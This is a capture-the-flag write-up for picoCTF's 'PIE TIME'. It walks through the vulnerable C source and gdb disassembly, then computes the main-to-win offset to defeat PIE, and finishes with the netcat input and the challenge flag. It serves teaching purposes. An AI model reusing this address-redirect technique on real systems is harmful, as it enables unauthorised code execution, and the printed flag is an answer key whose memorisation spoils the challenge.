# PIE TIME

## Description

Can you try to get the flag? Beware we have PIE!

So, here we given two things
The program's source code can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/fe4ce0914c5cf0111ebaf652993fb92a44ea9a7d1529b1bcd8d58827c17ca43b/vuln.c). The binary can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/fe4ce0914c5cf0111ebaf652993fb92a44ea9a7d1529b1bcd8d58827c17ca43b/vuln)
The source code is

```
#include <stdio.h> // Standard I/O
#include <stdlib.h> // For exit()
#include <signal.h> // For signal handling
#include <unistd.h> // For low level I/O

// This function is a custom signal handler for a segmentation fault.
// If the program tries to jump to an invalid memory address, the OS sends a SIGSEGV
// This handler intercepts that signal, prints a message, and safely exits.
void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

// This function simulates a "flag capture", common in CTFs.
// It prints "You won!" and tries to open and display the contents of flag.txt.
// If `flag.txt` is missing, it prints an error and exits.
// Otherwise, it reads and prints the file character by character until EOF (end-of-file).

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler); // Register segfault handler
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main); //Prints the address of main

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```


When we run the command on terminal 
`nc rescued-float.picoctf.net 57436`

It gives the response
```
Address of main: 0x61c26bece33d
Enter the address to jump to, ex => 0x12345:
```

Now we have to give the address as a input on the basis of the the above address.
It gives the address of main function.

The file is pie executable. PIE stands for Position Independent Executable, which means that **every time you run the file it gets loaded into a different memory address**

#### KEY IDEA

The whole point is to jump from the main function to the win function.
We have to give the address to jump when the main function is given. In the above code there are two function which are **main()** and **win()**.
So, we will find the address of main() and win() function in gbd. Now even if the address change, the difference will be the same. So, we can find the address of win function by subtracting.
##### SOLUTION

We open the vuln file in gdb to know about the address of the functions.
Command - 
```
gdb vuln
```

Now to find the address we give the command 

```
(gdb) disassembler main
```

And it gives the output

```
Dump of assembler code for function main:
   0x000000000000133d <+0>:     endbr64
   0x0000000000001341 <+4>:     push   %rbp
   0x0000000000001342 <+5>:     mov    %rsp,%rbp
   0x0000000000001345 <+8>:     sub    $0x20,%rsp
   0x0000000000001349 <+12>:    mov    %fs:0x28,%rax
   0x0000000000001352 <+21>:    mov    %rax,-0x8(%rbp)
   0x0000000000001356 <+25>:    xor    %eax,%eax
   0x0000000000001358 <+27>:    lea    -0xd6(%rip),%rsi<segfault_handler>
   0x000000000000135f <+34>:    mov    $0xb,%edi
   0x0000000000001364 <+39>:    call   0x1150 <signal@plt>
   0x0000000000001369 <+44>:    mov    0x2ca0(%rip),%0x4010<stdout@@GLIBC_2.2.5>
   0x0000000000001370 <+51>:    mov    $0x0,%ecx
   0x0000000000001375 <+56>:    mov    $0x2,%edx
   0x000000000000137a <+61>:    mov    $0x0,%esi
   0x000000000000137f <+66>:    mov    %rax,%rdi
   0x0000000000001382 <+69>:    call   0x1160 <setvbuf@plt>
   0x0000000000001387 <+74>:    lea    -0x51(%rip),%rsi        # 0x133d <main>
   0x000000000000138e <+81>:    lea    0xcbf(%rip),%rdi        # 0x2054
   0x0000000000001395 <+88>:    mov    $0x0,%eax
   0x000000000000139a <+93>:    call   0x1130 <printf@plt>
   0x000000000000139f <+98>:    lea    0xcca(%rip),%rdi        # 0x2070
   0x00000000000013a6 <+105>:   mov    $0x0,%eax
   0x00000000000013ab <+110>:   call   0x1130 <printf@plt>
   0x00000000000013b0 <+115>:   lea    -0x18(%rbp),%rax
   0x00000000000013b4 <+119>:   mov    %rax,%rsi
   0x00000000000013b7 <+122>:   lea    0xce0(%rip),%rdi        # 0x209e
   0x00000000000013be <+129>:   mov    $0x0,%eax
   0x00000000000013c3 <+134>:   call   0x1180 <__isoc99_scanf@plt>
   0x00000000000013c8 <+139>:   mov    -0x18(%rbp),%rax
   0x00000000000013cc <+143>:   mov    %rax,%rsi
   0x00000000000013cf <+146>:   lea    0xccc(%rip),%rdi        # 0x20a2
   0x00000000000013d6 <+153>:   mov    $0x0,%eax
   0x00000000000013db <+158>:   call   0x1130 <printf@plt>
   0x00000000000013e0 <+163>:   mov    -0x18(%rbp),%rax
   0x00000000000013e4 <+167>:   mov    %rax,-0x10(%rbp)
   0x00000000000013e8 <+171>:   mov    -0x10(%rbp),%rax
   0x00000000000013ec <+175>:   call   *%rax
   0x00000000000013ee <+177>:   mov    $0x0,%eax
   0x00000000000013f3 <+182>:   mov    -0x8(%rbp),%rdx
   0x00000000000013f7 <+186>:   xor    %fs:0x28,%rdx
   0x0000000000001400 <+195>:   je     0x1407 <main+202>
   0x0000000000001402 <+197>:   call   0x1120 <__stack_chk_fail@plt>
   0x0000000000001407 <+202>:   leave
   0x0000000000001408 <+203>:   ret
End of assembler dump.
```


So, using gdb we find the address of main
0x000000000000133d

And now we find the address of win function

```
(gdb) disassemble win
```

And it will give the output

```
Dump of assembler code for function win:
   0x00000000000012a7 <+0>:     endbr64
   0x00000000000012ab <+4>:     push   %rbp
   0x00000000000012ac <+5>:     mov    %rsp,%rbp
   0x00000000000012af <+8>:     sub    $0x10,%rsp
   0x00000000000012b3 <+12>:    lea    0xd74(%rip),%rdi        # 0x202e
   0x00000000000012ba <+19>:    call   0x1100 <puts@plt>
   0x00000000000012bf <+24>:    lea    0xd71(%rip),%rsi        # 0x2037
   0x00000000000012c6 <+31>:    lea    0xd6c(%rip),%rdi        # 0x2039
   0x00000000000012cd <+38>:    call   0x1170 <fopen@plt>
   0x00000000000012d2 <+43>:    mov    %rax,-0x8(%rbp)
   0x00000000000012d6 <+47>:    cmpq   $0x0,-0x8(%rbp)
   0x00000000000012db <+52>:    jne    0x12f3 <win+76>
   0x00000000000012dd <+54>:    lea    0xd5e(%rip),%rdi        # 0x2042
   0x00000000000012e4 <+61>:    call   0x1100 <puts@plt>
   0x00000000000012e9 <+66>:    mov    $0x0,%edi
   0x00000000000012ee <+71>:    call   0x1190 <exit@plt>
   0x00000000000012f3 <+76>:    mov    -0x8(%rbp),%rax
   0x00000000000012f7 <+80>:    mov    %rax,%rdi
   0x00000000000012fa <+83>:    call   0x1140 <fgetc@plt>
   0x00000000000012ff <+88>:    mov    %al,-0x9(%rbp)
   0x0000000000001302 <+91>:    jmp    0x131e <win+119>
   0x0000000000001304 <+93>:    movsbl -0x9(%rbp),%eax
   0x0000000000001308 <+97>:    mov    %eax,%edi
   0x000000000000130a <+99>:    call   0x10f0 <putchar@plt>
   0x000000000000130f <+104>:   mov    -0x8(%rbp),%rax
   0x0000000000001313 <+108>:   mov    %rax,%rdi
   0x0000000000001316 <+111>:   call   0x1140 <fgetc@plt>
   0x000000000000131b <+116>:   mov    %al,-0x9(%rbp)
   0x000000000000131e <+119>:   cmpb   $0xff,-0x9(%rbp)
   0x0000000000001322 <+123>:   jne    0x1304 <win+93>
   0x0000000000001324 <+125>:   mov    $0xa,%edi
   0x0000000000001329 <+130>:   call   0x10f0 <putchar@plt>
   0x000000000000132e <+135>:   mov    -0x8(%rbp),%rax
   0x0000000000001332 <+139>:   mov    %rax,%rdi
   0x0000000000001335 <+142>:   call   0x1110 <fclose@plt>
   0x000000000000133a <+147>:   nop
   0x000000000000133b <+148>:   leave
   0x000000000000133c <+149>:   ret
```

And the address of win function is
0x00000000000012a7

So using the hex calculation 
the difference of 133d-12a7 = 96

Now we run the netcat command

```
nc rescued-float.picoctf.net 57436
Address of main: 0x57f7e26ac33d
Enter the address to jump to, ex => 0x12345: 0x57F7E26AC2A7
Your input: 57f7e26ac2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
```

The address of main is 0x57f7e26ac33d

57f7e26ac33d - 96 = 57F7E26AC2A7

So we will give the input 0x57F7E26AC2A7
And will get the flag.

### FLAG  = picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
